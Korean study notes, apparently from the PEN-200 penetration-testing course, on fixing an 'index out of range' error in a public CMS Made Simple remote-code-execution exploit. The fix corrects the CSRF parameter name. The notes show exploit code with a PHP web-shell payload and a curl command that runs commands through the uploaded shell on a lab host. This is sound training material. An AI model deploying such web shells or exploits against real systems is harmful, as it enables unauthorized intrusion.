# 14.2.3 index out of range 오류 해결

> **Troubleshooting the “index out of range” Error** · PEN-200 §14.2.3

앞 절에서 고친 익스플로잇이 24행에서 죽음. 그 행은 `parse_csrf_token` 이 받은 `location` 문자열을 `split` 으로 자른 뒤 `[1]` 로 두 번째 조각을 꺼내는 코드임. 구분자는 `csrf_param` 변수("__c")에 등호를 붙인 것. `split` 은 구분자가 문자열에 없으면 원본 하나만 든 리스트를 돌려주므로, 그때 `[1]` 접근이 곧 `IndexError: list index out of range` 가 됨 — 오류의 정체는 구분자 불일치임.

```
kali@kali:~$ python
...
>>> mystr = "Kali*-*Linux*-*Rocks"
>>> result = mystr.split("*-*")
>>> result
['Kali', 'Linux', 'Rocks']
>>> result[1]
'Linux'
```

*`split` 의 동작 확인 — 구분자로 자른 조각이 리스트로 반환되고 인덱스로 꺼냄 (원문 Listing 327)*

익스플로잇에서 그 구분자를 만드는 곳은 파일 상단의 `csrf_param` 변수임.

```
csrf_param = "__c"
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = "<?php system($_GET['cmd']);?>"
def parse_csrf_token(location):
    return location.split(csrf_param + "=")[1]
```

*24행이 기대하는 구분자의 출처 — `csrf_param` 은 `"__c"` 로 하드코딩돼 있음 (원문 Listing 328)*

무엇이 잘려 들어오는지 보려면 `return` 직전에 대상 문자열을 그대로 찍는 줄을 넣음.

```
csrf_param = "__c"
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = "<?php system($_GET['cmd']);?>"
def parse_csrf_token(location):
    print "[+] String that is being split: " + location
    return location.split(csrf_param + "=")[1]
```

*`split` 호출 직전 값을 출력하도록 디버그 줄 삽입*

실행하면 애플리케이션이 돌려준 `Location` 헤더가 `__c` 가 아니라 `_sk_` 를 파라미터 이름으로 쓰고 있음이 드러남. (아래 출력의 줄바꿈은 원문 PDF 그대로임)

*디버그 출력에 `csrf_param` 값이 없음을 확인*

이름이 다른 이유는 확정 불가 — 버전 차이나 CMS 설정 차이가 후보이고 원문도 단정하지 않음. 익스플로잇 수정이 매끄러운 적은 없으므로, 응답에 맞춰 변수만 바꿔 보는 것이 다음 수순임.

```
csrf_param = "_sk_"
txt_filename = 'cmsmsrce.txt'
php_filename = 'shell.php'
payload = "<?php system($_GET['cmd']);?>"
```

*`csrf_param` 을 실제 응답값으로 교체*

재실행하면 오류가 사라지고 업로드·복사 뒤 셸 경로가 안내됨. 다만 성공 메시지는 증거가 아니므로 업로드된 PHP 셸에 `cmd` 파라미터로 명령을 넣어 실제 실행되는지 확인해야 함.

```
kali@kali:~$ curl -k https://192.168.50.45/uploads/shell.php?cmd=whoami
```

*업로드한 PHP 셸에 `whoami` 를 넘겨 코드 실행 확인*

`www-data` 가 돌아오면 웹셸이 살아 있는 것. 공개 익스플로잇이 예외로 죽을 때 펴는 절 — 죽은 행이 무엇을 기대했는지 읽고, 그 직전에 출력을 심어 실제값과의 차이를 좁힌 뒤, 최소한만 고치는 순서임.
